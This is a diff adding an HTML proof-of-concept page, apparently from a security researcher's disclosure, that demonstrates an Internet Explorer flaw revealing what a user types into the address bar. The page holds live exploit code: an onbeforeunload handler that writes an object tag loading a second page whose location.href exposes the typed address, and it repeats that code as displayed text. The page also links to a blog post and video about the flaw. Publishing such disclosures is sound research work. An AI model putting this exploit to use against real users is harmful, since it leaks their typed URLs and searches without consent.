@@ -1,0 +1,58 @@
+<!doctype html>
+<html>
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=8" />
+<title>PoC - Revealing the content of the address-bar on IE</title>
+<style type="text/css">
+a				{color:#A5A5FF}
+a:visited		{color:#A5A5FF}
+body			{font-family:Monospace;font-size:14pt;background-Color:#A5A5FF;color:#4242E7;text-align:center;}
+h3				{text-align:center;font-size:19pt;font-weight:bold;color:#ffeeee;text-shadow:-1px 0 black,0 4px black,1px 0 black,0 -1px black;}
+fieldset		{text-align:justify;width:100%;background-color:#4242E7;color:#dddddd;padding:4pt}
+li span			{cursor:pointer;text-decoration: underline}
+li span:hover	{color:white}
+legend			{font-size:18pt;font-weight:bold;color:#ffeeee;text-shadow:-1px 0 black,0 1px black,1px 0 black,0 -1px black;}
+</style>
+</head>
+<body>
+<script>
+window.onbeforeunload = function()
+{
+	document.write('<object data="loc.html" type="text/html" width="800" height="300"></object>');
+	document.close();
+}
+</script>
+
+
+<div style="width:80%;margin:0 auto;">
+
+<h3>Information Disclosure on IE <br /> Reveal what the user types into the address-bar</h3>
+<fieldset align="center"><legend align="center">PROOF OF CONCEPT</legend>
+With the help of an html/object tag, we can know what the user types into the address bar.<br /><br />
+Come on! Type anything into the address bar and press [ENTER]
+<br /><br />
+<hr />
+-------- MAIN PAGE --------<br /><br />
+window.onbeforeunload = function()<br />
+{<br />
+&nbsp;&nbsp;document.write('&lt;object data="<span style="color:#ff9999">loc.html</span>" type="text/html"&gt;&lt;/object&gt;');<br />
+&nbsp;&nbsp;document.close();<br />
+}<br />
+<br />
+
+
+---------- <span style="color:#ff9999">loc.html</span> ----------<br /><br />
+document.write(location.href); // returns address bar content<br /><br />
+<hr />
+<br />
+Blog: <a href="https://www.brokenbrowser.com/revealing-the-content-of-the-address-bar-ie" style="color:white">Revealing the content of the address bar on IE</a><br /><br />
+Video: <a href="https://www.youtube.com/watch?v=xyzd7PLqAV8&list=PL12o0t84rBX_oDmz93NwGNgTDiWf-HfUY" style="color:white">Revealing the content of the address bar on IE</a><br /><br />
+Contact: <a href="https://twitter.com/magicmac2000" style="color:white">Manuel Caballero || @magicmac2000</a><br /><br />
+
+</fieldset>
+<br />
+
+
+</div>
+</body>
+</html>
